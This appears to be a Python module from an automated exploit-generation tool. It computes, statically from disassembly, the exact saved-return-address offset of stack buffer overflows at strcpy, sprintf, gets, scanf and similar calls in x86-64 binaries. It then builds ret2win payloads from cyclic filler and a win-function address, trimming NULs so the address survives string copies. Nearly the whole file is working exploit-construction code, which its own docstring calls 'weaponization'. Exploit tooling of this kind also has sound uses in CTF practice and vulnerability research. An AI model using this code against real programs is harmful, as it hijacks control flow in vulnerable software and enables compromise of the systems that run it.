"""Static stack-overflow weaponization at the COPY SITE: the exact return-address offset and, where
the image allows it, a ret2win payload -- computed from the recovered IR, no execution.

`synthesize_poc` predicts the overflow offset from the recovered FRAME (the tightest buffer's
distance to the frame base). Detonating it confirms the offset, but the non-executed recipe it
files when the detonation is unavailable inherits two imprecisions the detonation used to hide:

  * the frame coordinates. rizin's stack-var offsets are rbp-relative (`var_8h` at -8 is
    `[rbp-8]`), so `ret_offset - var.offset` is the distance to the SAVED RBP, one word short of
    the return slot on an x86-64 frame-pointer frame. The live path tries +/- a word and never
    noticed; a recipe handed to an operator was simply wrong by 8 bytes.
  * the buffer. The tightest buffer in the function (or the program) is not necessarily the one
    the unbounded copy writes. The copy's destination register says which it is.

Here both are read off the sink's call site: `lea rdi,[rbp-0x110]; call strcpy` -> the destination
is rbp-0x110, the saved return is at rbp+8, so the offset is 0x118 exactly. For `sprintf(buf, "Hi
%s", user)` the rendered literal PREFIX ("Hi ") is subtracted, because those bytes land in the buffer
before the attacker's. With a win function on a non-PIE, canary-free frame the recipe climbs from a
crash sentinel (L1) to a ret2win payload (L3 candidate). x86-64 frame-pointer frames only; anything
else returns None and the caller keeps its frame-based prediction."""
from __future__ import annotations

import logging
import re
from typing import Optional

from . import elfstatic, x64frame

_log = logging.getLogger(__name__)

#: unbounded copy -> SysV register index of its DESTINATION buffer.
DEST_ARG = {"strcpy": 0, "stpcpy": 0, "strcat": 0, "sprintf": 0, "vsprintf": 0, "gets": 0,
            "scanf": 1, "sscanf": 2, "fscanf": 2, "memcpy": 0, "memmove": 0, "wcscpy": 0}
#: copies that stop at (and write) a NUL -- an embedded NUL in the payload ends the copy.
_NUL_TERMINATED = {"strcpy", "stpcpy", "strcat", "sprintf", "vsprintf", "wcscpy"}
_WS_TERMINATED = {"scanf", "sscanf", "fscanf"}


def _fmt_literal(target_bytes: bytes, text_src: str) -> Optional[bytes]:
    """The rodata bytes a `lea reg, [0x402004]` operand points at (rizin renders a resolved address
    in brackets; objdump-style `# 402004` comments are stripped before we see them)."""
    m = re.search(r"\[\s*(0x[0-9a-fA-F]+)\s*\]", text_src or "")
    if not m:
        return None
    return elfstatic.cstring_at(target_bytes, int(m.group(1), 16))


def _sprintf_prefix(fmtb: bytes):
    """(rendered prefix length, note) for a sprintf format whose FIRST conversion is the attacker's
    %s. None length when a non-%s conversion precedes it (variable width -> no fixed prefix)."""
    i, n = 0, 0
    while i < len(fmtb):
        c = fmtb[i:i + 1]
        if c != b"%":
            n += 1
            i += 1
            continue
        if fmtb[i + 1:i + 2] == b"%":
            n += 1
            i += 2
            continue
        m = re.match(rb"%[-+ #0]*\d*(?:\.\d+)?(?:hh|h|ll|l|z|j|t|L)?([a-zA-Z])", fmtb[i:])
        if not m:
            return None, "unparsed conversion"
        if m.group(1) == b"s":
            return n, None
        return None, f"a %{m.group(1).decode()} conversion precedes the string"
    return None, "no %s conversion"


def _texts_before(instrs, idx):
    return [t for _, t in instrs[:idx]]


def _has_canary(instrs) -> bool:
    return any(re.search(r"fs:\s*\[?\s*0x28", t) or "fs:0x28" in t.replace(" ", "")
               for _a, t in instrs[:24])


def overflow_layout(ir, site_addr, name: str, target_bytes: bytes = b"") -> Optional[dict]:
    """Exact geometry of an unbounded copy at `site_addr`: {offset (buffer start -> saved return),
    payload_offset (attacker bytes before the return slot, after any fixed sprintf prefix), prefix,
    dest_disp, canary, nul_terminated, notes}. None when the destination is not a literal rbp-frame
    stack slot."""
    reg_i = DEST_ARG.get(name)
    if reg_i is None:
        return None
    instrs = x64frame.instructions(ir)
    idx = x64frame.site_index(instrs, site_addr)
    if idx is None or x64frame.frame_geometry(instrs) is None:
        return None
    before = _texts_before(instrs, idx)
    src = x64frame.pointer_source(before, x64frame.ARG_REGS[reg_i])
    if not src or src[0] != "stack":
        return None
    if src[1] == "rbp":
        if src[2] >= 0:
            return None
        offset = -src[2] + 8                             # [rbp-X] .. saved rbp .. return at rbp+8
    else:                                                # rsp-relative inside an rbp frame
        F = x64frame.rsp_below_rbp(instrs, idx)
        if F is None or src[2] > F:
            return None
        offset = (F - src[2]) + 8
    notes, prefix = [], b""
    payload_offset = offset
    if name in ("sprintf", "vsprintf"):
        fsrc = x64frame.defining_text(before, "rsi")
        fmtb = _fmt_literal(target_bytes, fsrc or "") if target_bytes else None
        if fmtb is None:
            notes.append("sprintf format not resolved: if it renders a literal prefix before the "
                         "attacker's %s, subtract its length from the offset")
        else:
            n, why = _sprintf_prefix(fmtb)
            if n is None:
                notes.append(f"sprintf format {fmtb[:40]!r}: {why} -- the attacker bytes start at "
                             "a variable position, adjust the offset by that rendered width")
            else:
                prefix = fmtb[:n]
                payload_offset = offset - n
                notes.append(f"sprintf format {fmtb[:40]!r} renders {n} fixed byte(s) before the "
                             f"attacker string: the payload's own offset is {payload_offset}")
    if name == "strcat":
        notes.append("strcat appends after the buffer's current contents: subtract their length")
    return {"func": name, "offset": offset, "payload_offset": payload_offset, "prefix": prefix,
            "dest_disp": src[2], "dest_base": src[1], "canary": _has_canary(instrs),
            "nul_terminated": name in _NUL_TERMINATED, "ws_terminated": name in _WS_TERMINATED,
            "site": instrs[idx][0], "notes": notes}


def ret2win_payload(layout: dict, win_addr: int, *, word: int = 8,
                    endian: str = "little") -> Optional[bytes]:
    """Filler to the return slot + the win address (NUL-trimmed for a string copy, whose terminator
    then completes the zero high bytes of a no-PIE address). None when the address cannot cross the
    copy (an interior NUL / whitespace byte the sink stops at)."""
    from . import primitive
    off = int(layout["payload_offset"])
    if off <= 0:
        return None
    addr = (int(win_addr) & ((1 << (8 * word)) - 1)).to_bytes(word, endian)
    if layout.get("nul_terminated"):
        addr = addr.rstrip(b"\x00")
        if b"\x00" in addr:
            return None
    if layout.get("ws_terminated") and any(c in addr for c in b" \t\n\v\f\r"):
        return None
    return primitive.cyclic(off) + addr
